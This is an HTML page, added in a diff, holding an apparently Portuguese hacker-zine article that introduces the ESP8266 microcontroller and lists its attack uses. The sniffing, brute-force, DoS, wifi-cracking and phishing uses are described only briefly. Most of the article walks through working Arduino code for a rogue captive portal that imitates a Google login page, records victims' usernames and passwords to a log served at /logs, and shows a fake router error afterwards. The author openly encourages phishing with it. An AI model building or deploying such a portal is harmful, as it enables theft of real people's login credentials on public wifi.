@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>
+        body{
+            background-color: black;
+        }
+        a{
+            text-decoration: node;
+            color: red;
+            text-decoration-line: none;
+            text-decoration-color: none;
+        }
+        a:hover{
+            text-decoration: node;
+            color: red;
+            text-decoration-line: none;
+            text-decoration-color: none;
+        }
+    </style>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>introdução ao esp8266</title>
+</head>
+<body>
+<pre style="color: white">
+    ____________________________
+    /                           /\
+   /   Introdução Ao Esp8266  _/ /\
+  /                          / \/
+ /        By: Detrew         /\
+/___________________________/ /
+\___________________________\/
+ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \
+
+
+Oque é o Esp e por que 8266?
+
+o esp8266 é um microcontrolador de baixo consumo de ernegia que é muito ultilizado nas IoT da vida ele é fabricado por uma empresa chinesa chamada Espressif Systems O Numero 8266 se refere ao numero do chip que foi fabricado
+O esp8266 pe conhecido Por sua capacidade de se conectar a redes wifi e sua capacidade de processamento, apesar do seu tamanha relativamente pequeno (cabe ate em um bolso) ele possui um processador de 32 bits, memoria flash
+embutida e suporte a protocolos de comunicação Wifi como TCP/IP.
+Originalmente o esp8266 foi lançado como um modulo de wifi para facilitar a adição de conectividade a outros dispositivos eletrônicos. No entanto, devido a sua popularidade e versatilidade ele facilmente se tornou um dispositivo
+"unico" com suporte a programação por meio da linguagem c e arduino ide. O esp8266 oferece uma solução acessivel e poderosa para conectar a dispositivos e fazer ataques de redes e outras coisas como captive portal e afins
+
+Tipos De Ataques
+
+o esp8266 com essa praticidade e rapidez e sem puxar muita ernegia para fazer conexões e outras coisas, ele tem uma variedades de ataques para testar apenas usando ele Vou Citar alguns dos ataques deles abaixo:
+[Caputa De pacotes]
+O esp8266 pode ser configurado para capturar pacotes de rede em uma rede wifi, isso pode ser util para analizar o trafego ou pegar dados e fazer aquele glorioso Sniffin Na rede >:)
+[Ataques brute force]
+sim meio que obvio mais ele pode fazer aqueles de brute force em serviços como ssh, ftp e etc...
+[Ataques De DoS]
+Como ja da para saber ja que ele faz req para brute force ele tambem pode ser usado para derrubar serviços como https e outros eu não acho tão eficas pois ele não tem um processamento muito rapido para processar varios envios
+então ele possivelmente vai brekar em uma parte do caminho se o codigo não for bem codado para usufluir ao maximo a capacidade do esp8266
+[hack de wifi]
+O esp8266 tambem pode ser configurado para ataques de rede wifi para testar a criptografia e a eficacia da segurança wifi se aprofeitando de erros de protocolos de criptografia desatualizados.
+[Ataques De Phising (Captive Portal)]
+Fingir que Você é Aquela pagina de login de wifi da faculdade ou do trabalho é possivel com o esp8266 para pegar senhas e logins de usuarios desatentos combinados com o ataque de DoS na rede original Você Vai ter uma boa vantagem.
+Mais Enfim Vamos Para oque interessa que eu vou focar agora no ataque De Captive Portal
+
+Como fazer o ataque de captive portal?
+Na minha Outra Ezine Eu falei Sobre Como fazer um cloner de rfid e eu precisei de muitas coisas um arduino e a placa os cabos e tudo mais, maais com esse projeto apenas vamos usar o esp e nada mais, pois ele tem um microcontrolador
+e a memoria flash dele para agente poder colocar nossos codigos e rodar sem necessidade de outras ferramentas para o ataque :D
+Vamos la pois vou apresentar oque agente vai ter que fazer para o ataque for bem feito, para criar o captive portal usando o esp8266 Você precisara configurar o esp8266 como um ponto de acesso (AP = acess point) e implementar um 
+Server Web Embutido para servir as paginas do portal
+Vamos para o setup disso tudo irei usar um codigo Fornecido Do github e mostrar como funciona:
+[Importar as livrarias]
+Com o Arduino Ide Aberto E o setup do arduino ide feito para o esp8266 vamos apenas adicionar as livrarias Nessecarias E Vou Fazer com o exemplo de pagina de login da google :)
+
+_________________________________
+#include <ESP8266WiFi.h>
+#include <WiFiClient.h>
+#include <ESP8266WebServer.h>
+#include <DNSServer.h>
+#include <ESP8266mDNS.h>
+#include <FS.h>
+#include "google.h"
+#include "facebook.h"
+#include "yahoo.h"
+
+#define LOGFILE "/log.txt"
+---------------------------------
+aqui estamos importando as coisas necessarias e add um arquivo de log para sabemos oque pegamos no final 
+vamos agora definir o ssid do acess point usando apenas essa linha
+_________________________________
+const char *ssid="Detrew-Wifi";
+---------------------------------
+Definindo o ssid agora vamos setar a pagina no nosso caso google
+_________________________________
+#define captivePortalPage GOOGLE_HTML
+---------------------------------
+Okay Agora vamos setar as coisas como o ip do ap e a netmask e os bytes do dns e a porta do webServer 
+_________________________________
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 4, 1);
+IPAddress netMsk(255, 255, 255, 0);
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
+
+// Strings De buffer
+String webString="";
+String serialString="";
+---------------------------------
+Agora Vamos Fazer Algo Para mais dboas que é o led do esp8266 que vamos setar para ele piscar
+_________________________________
+void blink(int n)
+{
+  for(int i = 0; i < n; i++)
+  {
+    digitalWrite(LED_BUILTIN, LOW);    
+    delay(250);                    
+    digitalWrite(LED_BUILTIN, HIGH);  
+    delay(250);
+  }
+}
+---------------------------------
+Agora Vamos Para o setup do codigo todo eu vou tentar ser o mais explicativo em cada parte colocando os comentarios
+
+_________________________________
+void setup() {
+  //Inicia o esp8266
+  Serial.begin(9600);
+  Serial.println();
+  Serial.println("V2.0.0 - Rouge Captive Portal Attack Device");
+  Serial.println();
+
+  // o setup do led
+  pinMode(LED_BUILTIN, OUTPUT);
+  digitalWrite(LED_BUILTIN, HIGH);  
+
+  // Inicializar sistema de arquivos (SPIFFS) E escreve os logs no log.txt (crie o arquivo antes de rodar)
+  Serial.print("Iniciando Sistemas De arquivos (Isso pode demorar um tempo...).");
+  SPIFFS.begin();
+  Serial.println(" Sucesso!");
+  Serial.print(" Checkando pelo Log.txt");
+  // ve se tem o log.txt
+  File f = SPIFFS.open(LOGFILE, "r");
+  
+  if (!f) {
+    Serial.print(" Arquivo não existente\n Criando...");
+    SPIFFS.format();
+    // Abrir o arquivo em modo de escrita
+    File f = SPIFFS.open(LOGFILE, "w");
+    if (!f) {
+      Serial.println("Falha ao criar");
+    }
+    f.println("Capturado Credenciais de Login");
+  }
+  f.close();
+  Serial.println(" Successo!");
+
+  // Criar o ponto de acesso
+  Serial.print("Criando AP...");
+  WiFi.setOutputPower(20.5); // 
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, netMsk);
+  WiFi.softAP(ssid);
+  delay(500);
+  Serial.println(" Successo!");
+
+  // iniciando server de dns
+  Serial.print("Iniciando Servico de DNS.");
+  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
+  dnsServer.start(DNS_PORT, "*", apIP);
+  Serial.println(" Successo!");
+
+  // Olhando O dominio e regarregando a pagina
+  webServer.on("/", handleRoot);
+  webServer.on("/generate_204", handleRoot);
+  webServer.on("/fwlink", handleRoot); 
+  webServer.onNotFound(handleRoot);
+
+  // Validando A combinação Passada pelo usuario
+  webServer.on("/validate", []() {
+    // store harvested credentials
+    String url = webServer.arg("url");
+    String user = webServer.arg("user");
+    String pass = webServer.arg("pass");
+
+    // Enviando Data para o serial (DEBUG)
+    serialString = user+":"+pass;
+    Serial.println(serialString);
+
+    // Enviando Logins para o Log.txt
+    File f = SPIFFS.open(LOGFILE, "a");
+    f.print(url);
+    f.print(":");
+    f.print(user);
+    f.print(":");
+    f.println(pass);
+    f.close();
+    
+    //Envie uma resposta de erro ao usuário após a coleta de credenciais
+    webString = "#E701 - Router Configuration Error";
+    webServer.send(500, "text/html", webString);
+
+    // Reset buffer strings
+    serialString="";
+    webString="";
+
+    blink(5);
+  });
+
+  // Pagina de login
+  webServer.on("/logs", [](){
+    webString="Captured Logs";
+    File f = SPIFFS.open(LOGFILE, "r");
+    serialString = f.readString();
+    webString += serialString;
+    f.close();
+    webString += "clear all logs";
+    webServer.send(200, "text/html", webString);
+    Serial.println(serialString);
+    serialString="";
+    webString="";
+  });
+
+  // Limpar os logs
+  webServer.on("/logs/clear", [](){
+    webString="all logs clear";
+    File f = SPIFFS.open(LOGFILE, "w");
+    f.println("Captured Login Credentials:");
+    f.close();
+    webServer.send(200, "text/html", webString);
+    Serial.println(serialString);
+    serialString="";
+    webString="";
+  });
+  
+  // Start Webserver
+  Serial.print("Starting Web Server...");
+  webServer.begin();
+  Serial.println(" Successo!");
+  
+  blink(10);
+  
+  Serial.println("Esp Pronto para Ataque!");
+}
+---------------------------------
+
+Eu peguei o codigo de exemplo do github https://github.com/OxMarco/RogueCaptivePortal/blob/master/RogueCaptivePortal.ino
+junto com as paginas de logins estão la pois voces vão ter que entrar la para pegar as paginas de login :)
+eu tirei algumas cosias do html que ele printa pois ele ferra o paper xD olhe o codigo via github para ajudar 
+
+Enfim Apos isso é Apenas Mão Na massa e bom phising atravez desse captive portal, lembre-se que isso não faz milagre mais é otimo para descontrair Bom hacking para todos e Continue Lendo E lendo nossos textos <3
+
+
+                                 _ _           _                            _               _                      _        
+                                | (_)         | |                          | |             (_)                    | |       
+  _____  ___ __   __ _ _ __   __| |_ _ __   __| | ___        ___ ___  _ __ | |__   ___  ___ _ _ __ ___   ___ _ __ | |_ ___  
+ / _ \ \/ / '_ \ / _` | '_ \ / _` | | '_ \ / _` |/ _ \      / __/ _ \| '_ \| '_ \ / _ \/ __| | '_ ` _ \ / _ \ '_ \| __/ _ \ 
+|  __/>  <| |_) | (_| | | | | (_| | | | | | (_| | (_) |    / (_| (_) | | | | | | |  __/ (__| | | | | | |  __/ | | | || (_) |
+ \___/_/\_\ .__/ \__,_|_| |_|\__,_|_|_| |_|\__,_|\___/      \___\___/|_| |_|_| |_|\___|\___|_|_| |_| |_|\___|_| |_|\__\___/ 
+          | |                                                                                                                        
+          |_|                                                                                                                        
